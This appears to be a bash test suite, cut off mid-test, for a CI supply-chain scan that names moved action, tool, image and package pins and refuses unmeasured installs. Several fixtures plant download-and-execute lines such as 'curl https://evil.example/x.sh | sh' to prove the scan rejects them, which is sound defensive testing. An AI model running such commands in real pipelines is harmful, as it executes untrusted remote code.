#!/usr/bin/env bash
# proves: REQ-SUP-001-AC2, REQ-SUP-001-AC16, REQ-SUP-001-AC18, REQ-SUP-001-AC19, REQ-SUP-001-AC20, REQ-SUP-001-AC21, REQ-SUP-001-AC22, REQ-SUP-001-AC23, REQ-SUP-001-AC25, REQ-SUP-001-AC26, REQ-SUP-001-AC27
# The pin scan (owner ratified Oct 5, rule 1; the owner removed the wait for new versions on Nov 11 2026): a pull request that moves an action pin, or the version of a
# tool, image or package a workflow downloads, has every moved version NAMED, and fails only for an item the scan cannot read or pin and no ruling covers. Proved offline:
# each case builds a small git repository (a base commit and a head commit that moves one thing) and runs the real scan on it.
#   python3 bin/pin-age-check.py --root REPO --base REV --head REV [--json FILE] [--base-inputs FILE] [--exceptions FILE]
#   exit 0: nothing moved, or every moved version is a readable pin or ruled; exit 1: a moved item that is not a pin the scan can read and has no ruling.
#   An item is "<kind>:<name>@<version>"; kinds: action (version = the pinned commit), tool (the installer actions' version inputs and install-scanner.sh's
#   *_VER pins), gotool (go install path@version in run steps), package (pypi/<name>@<version> from the hash-pinned requirements), image (name@sha256:digest), apk (name@version of a row of build/locks/vm-kernel.lock; the row's sha256 is its sum).
set -euo pipefail
export GIT_AUTHOR_NAME=t GIT_AUTHOR_EMAIL=t@x GIT_COMMITTER_NAME=t GIT_COMMITTER_EMAIL=t@x   # CI runners have no git identity
here=$(cd "$(dirname "$0")" && pwd)
root=$(cd "$here/../../.." && pwd)
chk="$here/../supply-chain/pin-age-check.py"
work=$(mktemp -d); trap 'rm -rf "$work"' EXIT
pass=0 failn=0
ok()  { pass=$((pass+1)); echo "ok   $1"; }
bad() { failn=$((failn+1)); echo "FAIL $1"; }
CASE=""
check() { if "$@" >/dev/null 2>&1; then ok "$CASE"; else bad "$CASE"; fi; }
NOW="2026-10-05T12:00:00Z"
SHA1=$(printf '1%.0s' $(seq 40)); SHA2=$(printf '2%.0s' $(seq 40)); SHA3=$(printf '3%.0s' $(seq 40)); SHA4=$(printf '4%.0s' $(seq 40)); SHA5=$(printf '5%.0s' $(seq 40))
SHA6=$(printf '6%.0s' $(seq 40)); DIG4=sha256:$(printf '4%.0s' $(seq 64)); DIG5=sha256:$(printf '5%.0s' $(seq 64)); DIG1=sha256:$(printf '1%.0s' $(seq 64)); DIG2=sha256:$(printf '2%.0s' $(seq 64)); DIG3=sha256:$(printf '3%.0s' $(seq 64))

# --- the base repository: one of every kind of pin --------------------------------------------------------------------
base="$work/base"; mkdir -p "$base/.github/workflows" "$base/.github/actions/local" "$base/.github/pins" "$base/bin" "$base/build/docker"
cat >"$base/.github/workflows/ci.yml" <<EOF
on: pull_request
jobs:
  j:
    runs-on: ubuntu-latest
    container:
      image: ghcr.io/own/ci@$DIG1
    steps:
      - uses: actions/checkout@$SHA1 # v4.1.0
      - uses: golangci/golangci-lint-action@$SHA2 # v9.3.0
        with:
          version: v2.13.2
      - uses: actions/setup-go@$SHA3 # v6.0.0
        with:
          go-version: '1.27'
      - uses: actions/setup-python@$SHA4 # v6.1.0
        with:
          python-version: '3.12'
      - run: |
          go install github.com/securego/gosec/v2/cmd/gosec@v2.29.0
          python3 -m pip install --require-hashes -r .github/pins/adjudicator-requirements.txt
      - uses: goreleaser/goreleaser-action@$SHA6 # v7.2.3
        with:
          version: '2.17.1'
      - uses: helm/kind-action@$SHA6 # v1.15.0
        with:
          node_image: kindest/node:v1.31.0@$DIG4
      - run: |
          curl -fsSL https://github.com/cli/cli/releases/download/v2.40.0/gh_2.40.0_linux_amd64.tar.gz -o gh.tgz
          python3 -m pip install --quiet black==24.1.0
          docker run --rm alpine:3.20@$DIG5 true
EOF
cat >"$base/.github/actions/local/action.yml" <<EOF
name: local
runs:
  using: composite
  steps:
    - uses: actions/cache@$SHA5 # v4.2.0
EOF
cat >"$base/bin/install-scanner.sh" <<'EOF'
#!/usr/bin/env bash
TRIVY_VER=0.74.0
GRYPE_VER=0.118.0
case "${TOOL}:${arch}" in
  trivy:x86_64|trivy:amd64) SUM=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ;;
esac
EOF
cat >"$base/.github/pins/adjudicator-requirements.txt" <<'EOF'
# hash-pinned
anthropic==1.9.0 \
    --hash=sha256:aaaa
requests==2.32.0 \
    --hash=sha256:bbbb
EOF
printf 'FROM gcr.io/distroless/static@%s\n' "$DIG2" >"$base/build/docker/Dockerfile.production"
printf 'module x\n\ngo 1.27\n\ntoolchain go1.27.1\n\nrequire github.com/foo/bar v1.0.0\n' >"$base/go.mod"
git -C "$base" init -q; git -C "$base" add -A; git -C "$base" -c user.name=t -c user.email=t@x commit -q -m base

# newcase NAME 'python edit run in the repo root' -> $work/NAME (a copy of base with a head commit)
newcase() {
  local n=$1; rm -rf "$work/$n"; cp -R "$base" "$work/$n"
  ( cd "$work/$n" && python3 - "$2" <<'PY'
import sys
exec(sys.argv[1])
PY
    git add -A; git -c user.name=t -c user.email=t@x commit -q -m head )
}
# runck NAME [extra args] -> sets rc, $work/NAME.out
runck() {
  local n=$1; shift; rc=0
  python3 "$chk" --root "$work/$n" --base HEAD~1 --head HEAD --json "$work/$n.json" "$@" >"$work/$n.out" 2>&1 || rc=$?
}
sub() { python3 -c "import sys;print('import pathlib; p=pathlib.Path(%r); p.write_text(p.read_text().replace(%r,%r))' % tuple(sys.argv[1:]))" "$@"; }

# --- nothing moves ------------------------------------------------------------------------------------------------------
newcase none "pathlib=__import__('pathlib'); pathlib.Path('README.md').write_text('hi')"
runck none
CASE="no pin moved: exit 0, says so, and needs no data at all"
check test "$rc" -eq 0; check grep -qi 'no pin moved' "$work/none.out"

# --- an action pin moves: AC2 names it ---------------------------------------------------------------
NEW1=$(printf 'a%.0s' $(seq 40))
newcase act "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")"
runck act
CASE="a moved action pin named by its commit is a readable pin: exit 0, and the scan NAMES it"
check test "$rc" -eq 0; check grep -q "action:actions/checkout@$NEW1" "$work/act.out"
check python3 - "$work/act.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))
assert not {"min_days", "now"} & set(d), d
assert all(not {"proof", "age", "age_days", "held", "hold"} & set(m) for m in d["moved"]), d
assert "young" not in json.dumps(d).lower(), d
PY
newcase actrange "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@v4 # v4.2.0")"
runck actrange
CASE="an action moved to a tag, not a commit, is not a pin the scan can read: FAIL (exit 1), named"
check test "$rc" -eq 1; check grep -qi 'FAIL' "$work/actrange.out"; check grep -q "action:actions/checkout@v4" "$work/actrange.out"
CASE="the scan has no time options: --min-days, --fixtures and --now are refused (exit 2)"
for opt in "--min-days 30" "--fixtures $work/act.json" "--now 2026-10-05T12:00:00Z"; do
  rc=0; python3 "$chk" --root "$work/act" --base HEAD~1 --head HEAD $opt >/dev/null 2>&1 || rc=$?
  check test "$rc" -eq 2
done
CASE="the scan has no cosign-verify subcommand: the old call is refused as unknown (exit 2, usage)"
rc=0; python3 "$chk" cosign-verify --root "$work/act" --head HEAD --cosign-image "gcr.io/x/y@$DIG1" >"$work/cv.out" 2>&1 || rc=$?
check test "$rc" -eq 2; check grep -qi 'usage' "$work/cv.out"
CASE="the option --min-days is refused as an unknown argument (usage on stderr, no scan)"
rc=0; python3 "$chk" --root "$work/act" --base HEAD~1 --head HEAD --min-days 30 >"$work/md.out" 2>&1 || rc=$?
check test "$rc" -eq 2; check grep -qi 'usage' "$work/md.out"; check grep -qi 'unrecognized\|min-days' "$work/md.out"
# A harness that runs the scan in-process with every network and clock door shut: a socket connect, a gh, curl or wget program, an urllib open, and a read of the
# wall clock from the scan's own code each raise AND leave a mark in $work/door.log. A scan that measures nothing never touches one.
cat >"$work/shut.py" <<'PY'
import datetime, os, runpy, socket, subprocess, sys, time, urllib.request
chk, log, args = sys.argv[1], sys.argv[2], sys.argv[3:]
sup = os.path.dirname(os.path.abspath(chk))
def mark(what):
    open(log, "a").write(what + "\n")
    raise RuntimeError("door shut: " + what)
def from_scan():
    f = sys._getframe(2)
    while f:
        if os.path.abspath(f.f_code.co_filename).startswith(sup + os.sep):
            return True
        f = f.f_back
    return False
def net(*a, **k): mark("network")
socket.socket.connect = net; socket.create_connection = net; urllib.request.urlopen = net
orig_run, orig_popen = subprocess.run, subprocess.Popen
def prog(cmd):
    c = cmd[0] if isinstance(cmd, (list, tuple)) and cmd else str(cmd)
    return os.path.basename(str(c))
def run(cmd, *a, **k):
    if prog(cmd) in ("gh", "curl", "wget"): mark("program " + prog(cmd))
    return orig_run(cmd, *a, **k)
class Popen(orig_popen):
    def __init__(self, cmd, *a, **k):
        if prog(cmd) in ("gh", "curl", "wget"): mark("program " + prog(cmd))
        super().__init__(cmd, *a, **k)
subprocess.run, subprocess.Popen = run, Popen
class DT(datetime.datetime):
    @classmethod
    def now(cls, *a, **k):
        if from_scan(): mark("clock")
        return super().now(*a, **k)
    @classmethod
    def utcnow(cls):
        if from_scan(): mark("clock")
        return super().utcnow()
    @classmethod
    def today(cls):
        if from_scan(): mark("clock")
        return super().today()
datetime.datetime = DT
real_time = time.time
def tt():
    if from_scan(): mark("clock")
    return real_time()
time.time = tt
sys.argv = [chk, *args]
try:
    runpy.run_path(chk, run_name="__main__")
except SystemExit as e:
    sys.exit(e.code)
PY
shut() { # NAME -> rc, $work/NAME.shut.out; $work/door.log is empty when no door was touched
  local n=$1; shift; : >"$work/door.log"; rc=0
  GITHUB_REPOSITORY=o/r GITHUB_TOKEN=x GH_TOKEN=x python3 "$work/shut.py" "$chk" "$work/door.log" --root "$work/$n" --base HEAD~1 --head HEAD "$@" >"$work/$n.shut.out" 2>&1 || rc=$?
}
CASE="the door harness is live: a program that opens a socket is caught, marked and stopped"
printf 'import socket\nsocket.socket().connect(("127.0.0.1", 9))\n' >"$work/door-probe.py"
: >"$work/door.log"; rc=0; python3 "$work/shut.py" "$work/door-probe.py" "$work/door.log" >/dev/null 2>&1 || rc=$?
check test "$rc" -ne 0; check grep -q network "$work/door.log"
shut act
CASE="a moved action pin named by its commit passes (exit 0) with no network call, no gh or curl and no read of the clock by the scan"
check test "$rc" -eq 0; check grep -q "action:actions/checkout@$NEW1" "$work/act.shut.out"; check test ! -s "$work/door.log"

# --- every other kind of pin the scan covers (AC2) ---------------------------------------------------------------------
cover() { # <name> <edit> <item key>
  newcase "$1" "$2"
  runck "$1"
  CASE="$1: moved, named and accepted as a readable pin"; check test "$rc" -eq 0; check grep -qF "$3" "$work/$1.out"
}
cover tool-scanner "$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')" "tool:trivy@0.75.0"
cover tool-installer-input "$(sub .github/workflows/ci.yml 'version: v2.13.2' 'version: v2.14.0')" "tool:golangci-lint@v2.14.0"
cover tool-python-version "$(sub .github/workflows/ci.yml "python-version: '3.12'" "python-version: '3.13.1'")" "tool:python@3.13.1"
cover gotool "$(sub .github/workflows/ci.yml 'gosec@v2.29.0' 'gosec@v2.30.0')" "gotool:github.com/securego/gosec/v2/cmd/gosec@v2.30.0"
cover package "$(sub .github/pins/adjudicator-requirements.txt 'anthropic==1.9.0' 'anthropic==1.10.0')" "package:pypi/anthropic@1.10.0"
cover image-container "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci@$DIG3")" "image:ghcr.io/own/ci@$DIG3"
cover tool-goreleaser "$(sub .github/workflows/ci.yml "version: '2.17.1'" "version: '2.18.0'")" "tool:goreleaser@2.18.0"
cover tool-curl-download "$(sub .github/workflows/ci.yml 'releases/download/v2.40.0/gh_2.40.0_linux_amd64' 'releases/download/v2.41.0/gh_2.41.0_linux_amd64')" "tool:cli/cli/gh_2.41.0_linux_amd64.tar.gz@v2.41.0"
cover package-in-run-step "$(sub .github/workflows/ci.yml 'black==24.1.0' 'black==24.2.0')" "package:pypi/black@24.2.0"
cover image-in-run-step "$(sub .github/workflows/ci.yml "alpine:3.20@$DIG5" "alpine:3.20@$DIG3")" "image:alpine@$DIG3"
cover image-installer-input "$(sub .github/workflows/ci.yml "kindest/node:v1.31.0@$DIG4" "kindest/node:v1.31.0@$DIG3")" "image:kindest/node@$DIG3"
for k in tool-scanner tool-installer-input gotool package image-container tool-goreleaser tool-curl-download image-in-run-step; do
  shut "$k"
  CASE="a moved $k item (an exact version or a digest) passes with no network call and no clock read"
  check test "$rc" -eq 0; check test ! -s "$work/door.log"
done
shut actrange
CASE="an unreadable moved item (a tag where a commit is needed) still exits 1 with no network call and no clock read: it is refused by its text alone"
check test "$rc" -eq 1; check test ! -s "$work/door.log"
shut none
CASE="a pull request that moves nothing exits 0 with no network call and no clock read"
check test "$rc" -eq 0; check test ! -s "$work/door.log"
NEW5=$(printf 'b%.0s' $(seq 40))
cover local-composite-action "$(sub .github/actions/local/action.yml "actions/cache@$SHA5" "actions/cache@$NEW5")" "action:actions/cache@$NEW5"

# --- name:tag@sha256:digest counts as PINNED (Docker ignores the tag when a digest is present): the image is the name without the tag, the version the digest ----
newcase tagdigest "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci:v2@$DIG3")"
runck tagdigest
CASE="an image written name:tag@sha256:digest is the SAME item as name@sha256:digest (the tag is ignored): moved, named by its digest, and accepted"
check test "$rc" -eq 0; check grep -qF "image:ghcr.io/own/ci@$DIG3" "$work/tagdigest.out"
newcase tagonly "$(sub .github/workflows/ci.yml "ghcr.io/own/ci@$DIG1" "ghcr.io/own/ci:v2")"
runck tagonly
CASE="an image with only a tag (no digest) is not a pin the scan can read: it fails rather than passing silently"
check test "$rc" -eq 1

# --- NOT covered: the product's base image, Go modules, the Go toolchain (amendments 1 and 2) -------------------------------------
newcase notcovered "$(sub build/docker/Dockerfile.production "$DIG2" "$DIG3")
$(sub go.mod 'go1.27.1' 'go1.27.2')
$(sub .github/workflows/ci.yml "go-version: '1.27'" "go-version: '1.28'")
$(sub go.mod 'v1.0.0' 'v1.1.0')"
runck notcovered
CASE="the product base image, a Go module bump, go.mod's toolchain and setup-go's version are NOT covered: they move with no failure"
check test "$rc" -eq 0; check grep -qi 'no pin moved' "$work/notcovered.out"

# --- several moves: every one is named, one unreadable one fails the whole check ---------------------------------------------------------
newcase multi "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")
$(sub bin/install-scanner.sh 'TRIVY_VER=0.74.0' 'TRIVY_VER=0.75.0')
$(sub .github/workflows/ci.yml "python-version: '3.12'" "python-version: '3.13'")"
runck multi
CASE="three moves, one of them a series, not an exact release: exit 1, and the output names ALL THREE (so a reviewer sees what moved) and blames the series"
check test "$rc" -eq 1
check grep -qF "action:actions/checkout@$NEW1" "$work/multi.out"; check grep -qF "tool:trivy@0.75.0" "$work/multi.out"; check grep -qF "tool:python@3.13" "$work/multi.out"
check python3 - "$work/multi.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))
moved = {m["item"]: m for m in d["moved"]}
assert set(moved) == {"action:actions/checkout@" + "a" * 40, "tool:trivy@0.75.0", "tool:python@3.13"}, sorted(moved)
assert moved["tool:python@3.13"]["ok"] is False and moved["tool:trivy@0.75.0"]["ok"] is True, moved
PY

# --- a NEW pin counts as moved; a removed pin is no problem --------------------------------------------------------------
NEW6=$(printf 'c%.0s' $(seq 40))
newcase added "$(sub .github/workflows/ci.yml "      - uses: actions/checkout@$SHA1 # v4.1.0" "      - uses: actions/checkout@$SHA1 # v4.1.0"$'\n'"      - uses: actions/upload-artifact@$NEW6 # v7.0.1")"
runck added
CASE="a brand-new action pin counts as moved: it is named, and a readable pin passes"
check test "$rc" -eq 0; check grep -qF "action:actions/upload-artifact@$NEW6" "$work/added.out"
newcase removed "$(sub .github/workflows/ci.yml "      - uses: actions/checkout@$SHA1 # v4.1.0" "")"
runck removed
CASE="removing a pin is no problem: exit 0"
check test "$rc" -eq 0

# --- an UNCHANGED pin is never named ----------
runck none
CASE="an unchanged workflow with 5 pins moves nothing (only what MOVED is named)"
check test "$rc" -eq 0; check grep -qi 'no pin moved' "$work/none.out"

# --- a workflow whose filename is not ASCII is still read (git quotes such paths; a pin there must never go unnamed) --------------------------------------------
newcase unicode "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEW1 # v4.2.0")
import pathlib, shutil
shutil.copy('.github/workflows/ci.yml', '.github/workflows/\u00e9.yml')
pathlib.Path('.github/workflows/ci.yml').write_text(pathlib.Path('.github/workflows/ci.yml').read_text().replace('actions/checkout@$NEW1', 'actions/checkout@$SHA1'))"
runck unicode
CASE="a new pin in .github/workflows/\u00e9.yml (a non-ASCII file name) is named like any other (the copied file also holds placeholders no pin can resolve, so the scan exits 1)"
check test "$rc" -eq 1; check grep -qF "action:actions/checkout@$NEW1" "$work/unicode.out"; check grep -qE 'FAIL .*not a pin|FAIL unmeasured' "$work/unicode.out"

# --- the scan reads no time and asks no server: no live or fixture source is left in it ---------------------------------------------------
CASE="the scan defines none of the time-source names: live proof, observer, PR clock, registry and index times, fixture class, minimum age"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
for n in ("live_proofs", "observed", "_pr_clock", "_registry_push", "_go_index_time", "_release_time", "_commit_date", "Fixture", "Live", "MIN_DAYS", "SERVER_SIDE", "tobs"):
    assert not hasattr(ac, n), n
PY

# --- plain forms from review round 3: pip extras and operators, an indented requirements line, a tag-only docker run, an expression that holds `|`, an action's subdirectory -----------------------------------
newcase extras "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          pip install requests[socks]==2.99.0 urllib3>=2.0\n          docker run --rm -e A=b alpine:3.99 true\n          go install example.org/tool@${{secrets.PRIVATE_VERSION||'"'"'v1.2.3'"'"'}}')"
runck extras
CASE="pip extras (requests[socks]==2.99.0), a range (urllib3>=2.0), a tag-only docker run image and an expression containing || are all inventory items; the expression's secret name never prints"
check test "$rc" -eq 1; check grep -qF "package:pypi/requests@2.99.0" "$work/extras.out"; check grep -qF "package:pypi/urllib3@>=2.0" "$work/extras.out"; check grep -qF "image:alpine:3.99@" "$work/extras.out"
check bash -c "! grep -rq PRIVATE_VERSION '$work/extras.out' '$work/extras.json'"; check grep -qF 'gotool:example.org/tool@${{expression}}' "$work/extras.out"
newcase subdir "$(sub .github/workflows/ci.yml '      - run: |' $'      - uses: github/codeql-action/init@'$SHA6$' # v3\n      - run: |')"
git -C "$work/subdir" commit -q --amend -m head
newcase subdir2 "$(sub .github/workflows/ci.yml '      - run: |' $'      - uses: github/codeql-action/analyze@'$SHA6$' # v3\n      - run: |')"
runck subdir2
CASE="an action's subdirectory is part of its identity: github/codeql-action/analyze@sha is named as such"
check test "$rc" -eq 0; check grep -qF "action:github/codeql-action/analyze@$SHA6" "$work/subdir2.out"
newcase indentreq "$(sub .github/pins/adjudicator-requirements.txt 'requests==2.32.0' '  requests[security]==2.40.0')"
runck indentreq
CASE="an indented requirements line and a requirement with extras are read"
check test "$rc" -eq 0; check grep -qF "package:pypi/requests@2.40.0" "$work/indentreq.out"

# --- a hostile line cannot stall the readers; the scout versions named in install-scanner.sh; forms this inventory does not measure are listed, never silently empty ---------------------------------
CASE="inventory: a run line of 200 repeated expressions (a pattern-backtracking probe) is read in well under a second"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, time
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
t = time.process_time()  # this process's CPU: in-process parsing only, so box load cannot fail it
for body in ("curl https://github.com/a/b/releases/download/v" + "${{ x }}" * 200, "go install example.org/t@" + "${{ x }}" * 200, "pip install foo==" + "${{ x }}" * 200):
    inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + body + "\n"})
try:
    inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: " + "x" * 100000 + "\n"})
except RuntimeError as e:
    assert "refusing to read it partially" in str(e)
else:
    raise AssertionError("an over-long command line was read as its prefix")
assert time.process_time() - t < 3, time.process_time() - t
PY
CASE="inventory: docker-scout-X.Y.Z versions in install-scanner.sh's case list are tool:scout items; releases/latest/download is an unprovable item; go run and go get x@v are go tools"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({"bin/install-scanner.sh": "SCOUT_VER=1.26.0\ncase x in docker-scout|docker-scout-1.25.0|docker-scout-1.24.0) ;; esac\n",
                     ".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          curl -L https://github.com/o/r/releases/latest/download/x.tgz\n          go run example.org/tool@v1.2.3\n          go get example.org/other@v2.0.0\n"})
for k in ("tool:scout@1.25.0", "tool:scout@1.24.0", "tool:scout@1.26.0", "tool:o/r@latest", "gotool:example.org/tool@v1.2.3", "gotool:example.org/other@v2.0.0"):
    assert k in got, (k, sorted(got))
PY
CASE="inventory: install forms it does not measure (npm, apt, gh release download, a pip URL, a non-release download) are LISTED"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
f = {".github/workflows/a.yml": "x: npm install left-pad\ny: sudo apt-get install -y skopeo\nz: gh release download v1\nw: pip install git+https://x/y@z\nv: curl -O https://example.org/t.tgz\n"}
whats = {k[1] for k in inv.unmeasured(f)}
assert whats == {"a package-manager install", "a system package install", "a gh release or extension download", "a pip install from a URL", "a download"}, whats
PY

CASE="inventory: docker run with a quoted image, with --cpus 2, and bare pip install names are items; a range, (unpinned) or an expression is NEVER a pin the scan can read"
check python3 - "$here/../supply-chain/pin-inventory.py" "$chk" <<'PY'
import importlib.util, sys, datetime as dt
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv); _inv = inv.inventory; inv.inventory = lambda f: {__import__("re").sub(r"#step:[0-9a-f]+$", "", k): v for k, v in _inv(f).items()}
got = inv.inventory({".github/workflows/a.yml": "jobs:\n  j:\n    steps:\n      - run: |\n          docker run --rm \"alpine:3.99\" true\n          docker run --cpus 2 --memory 1g busybox:1.36 true\n          pip install requests flask[async]\n"})
for k in ("image:alpine:3.99@", "image:busybox:1.36@", "package:pypi/requests@(unpinned)", "package:pypi/flask@(unpinned)"):
    assert k in got, (k, sorted(got))
spec = importlib.util.spec_from_file_location("ac", sys.argv[2]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
for v in (">=2.0", "(unpinned)", "latest", "${{expression}}"):
    ok, why = ac.judge_item(inv.Item("package", "pypi/p", v))
    assert not ok and "not a pin" in why, (v, why)
for v in ("v2", "2.17", "v2.17"):     # a tag-form ref is no pin where a commit is needed (an action), and a tag-only image has no digest
    ok, why = ac.judge_item(inv.Item("action", "o/r", v))
    assert not ok and "not a pin" in why, (v, why)
for k in ("image:alpine:3.99@", "image:busybox:1.36@"):
    ok, why = ac.judge_item(got[k])
    assert not ok and "not a pin" in why, (k, why)
PY
CASE="inventory: a subdirectory taken from untrusted action metadata is redacted like every other part of a key"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
assert "PRIVATE_CANARY" not in inv.Item("action", "o/r", "a" * 40, "", "x/${{secrets.PRIVATE_CANARY}}").key
PY

# --- a PR that ADDS an install form this check cannot measure is refused (it says what it cannot resolve, then refuses it) ---------------------------------------------------------------------------
newcase unm1 "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: npm install -g left-pad\n      - run: |')"
runck unm1
CASE="a PR that adds npm install to a workflow is refused (exit 1, unmeasured named), though nothing in the inventory moved"
check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/unm1.out"; check grep -qi 'not measurable' "$work/unm1.out"
newcase unm2 "$(printf 'import pathlib\npathlib.Path(\"tools\").mkdir(exist_ok=True)\npathlib.Path(\"tools/fetch.sh\").write_text(\"#!/bin/sh\\ncargo install ripgrep\\n\")')"
runck unm2
CASE="the same in a shell script outside .github (tools/fetch.sh) is refused too"
check test "$rc" -eq 1; check grep -q 'unmeasured:tools/fetch.sh' "$work/unm2.out"
newcase unm3 "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: sudo apt-get install -y skopeo\n      - run: |')"
git -C "$work/unm3" commit -q --amend -m head
git -C "$work/unm3" checkout -q -b b2; printf 'x\n' >"$work/unm3/README.md"; git -C "$work/unm3" add -A; git -C "$work/unm3" -c user.name=t -c user.email=t@x commit -q -m "touch readme"
CASE="an unmeasured form already in the base (count unchanged by the head) is not refused: only an ADDED one is"
rc=0; python3 "$chk" --root "$work/unm3" --base HEAD~1 --head HEAD >"$work/unm3.out" 2>&1 || rc=$?
check test "$rc" -eq 0

CASE="tags come from ONE git ls-remote (annotated tags peeled), never one REST call per annotated tag"
check python3 - "$chk" <<'PY'
import importlib.util, subprocess, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
calls = []
def run(cmd, **k):
    calls.append(cmd)
    out = "t1\trefs/tags/v4\n" + "c1\trefs/tags/v4.1.0\n" + "t2\trefs/tags/v3\n" + "c1\trefs/tags/v3^{}\n" + "c9\trefs/tags/v9\n"
    return subprocess.CompletedProcess(cmd, 0, out, "")
subprocess.run = run
assert ac._tags_for_commit("o/r", "c1") == ["v3", "v4.1.0"], ac._tags_for_commit("o/r", "c1")        # v3 is annotated: peeled to c1
assert ac._tags_for_commit("o/r", "c9") == ["v9"] and len(calls) == 1 and calls[0][:3] == ["git", "ls-remote", "--tags"], calls
ac._TAGS.clear()
subprocess.run = lambda cmd, **k: subprocess.CompletedProcess(cmd, 128, "", "fatal")
try:
    ac._tags_for_commit("o/r", "c1")
except ac.CouldNotLook:
    pass
else:
    raise AssertionError("a failed ls-remote was read as no tags")
PY
rm -rf "$work/swap2"; cp -R "$base" "$work/swap2"
python3 - "$work/swap2" <<'PY'
import pathlib, subprocess, sys
root = pathlib.Path(sys.argv[1]); f = root / ".github/workflows/ci.yml"
f.write_text(f.read_text().replace("      - run: |", "      - run: curl http://localhost:8080/health\n      - run: |", 1))
g = lambda *a: subprocess.run(["git", "-C", str(root), "-c", "user.name=t", "-c", "user.email=t@x", *a], check=True, capture_output=True)
g("add", "-A"); g("commit", "-q", "-m", "base2")
f.write_text(f.read_text().replace("curl http://localhost:8080/health", "curl https://evil.example/x.sh | sh"))
g("add", "-A"); g("commit", "-q", "-m", "head")
PY
runck swap2
CASE="an in-place SWAP of one unmeasured command for another (localhost curl -> evil download) is an addition: refused, though the count did not change"
check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/swap2.out"
newcase cont "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          curl -fsSL \\\n            https://evil.example/x.sh | sh\n          sudo apt-get -y install foo\n          npm -g install bar\n      - run: |')"
runck cont
CASE="continuation lines, apt-get -y install and npm -g install are all recognised as unmeasured forms and refused"
check test "$rc" -eq 1; check grep -q 'a download' "$work/cont.out"; check grep -q 'a system package install' "$work/cont.out"; check grep -q 'a package-manager install' "$work/cont.out"
newcase scanner "$(printf 'import pathlib\np = pathlib.Path(\"bin/install-scanner.sh\")\np.write_text(p.read_text() + \"curl -fsSL https://evil.example/x.sh | sh\\n\")')"
runck scanner
CASE="a download appended to bin/install-scanner.sh is refused too (the file is read for unmeasured forms as well as its *_VER pins)"
check test "$rc" -eq 1; check grep -q 'unmeasured:bin/install-scanner.sh' "$work/scanner.out"

CASE="a swap after column 160 of a long download line is still an addition (the whole normalised line decides identity), and a non-UTF-8 file never crashes the readers"
check python3 - "$here/../supply-chain/pin-inventory.py" "$work" <<'PY'
import importlib.util, subprocess, sys, os
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
long_a = "curl -fsSL https://good.example/" + "a" * 200 + "/ok.sh -o ok.sh"
long_b = "curl -fsSL https://good.example/" + "a" * 200 + "/ok.sh -o evil.sh"
ka = inv.unmeasured({".github/workflows/a.yml": "x: " + long_a + "\n"}); kb = inv.unmeasured({".github/workflows/a.yml": "x: " + long_b + "\n"})
assert set(ka) != set(kb), "the key must differ when only the tail differs"
repo = sys.argv[2] + "/badutf"; os.makedirs(repo + "/.github/workflows", exist_ok=True)
subprocess.run(["git", "init", "-q", repo], check=True)
open(repo + "/.github/workflows/a.yml", "wb").write(b"on: x\njobs:\n  j:\n    steps:\n      - run: echo \xff\xfe\n")
subprocess.run(["git", "-C", repo, "add", "-A"], check=True); subprocess.run(["git", "-C", repo, "commit", "-q", "-m", "x"], check=True)
inv.load_at(repo, "HEAD"); inv.tree_scripts(repo, "HEAD")   # no UnicodeDecodeError
PY

CASE="forms outside workflow run steps are measured too: a script's go install / pip / docker run / release download, install-scanner.sh's *_VERSION and download source, a composite action anywhere, a local action reference, an oddly named requirements file"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
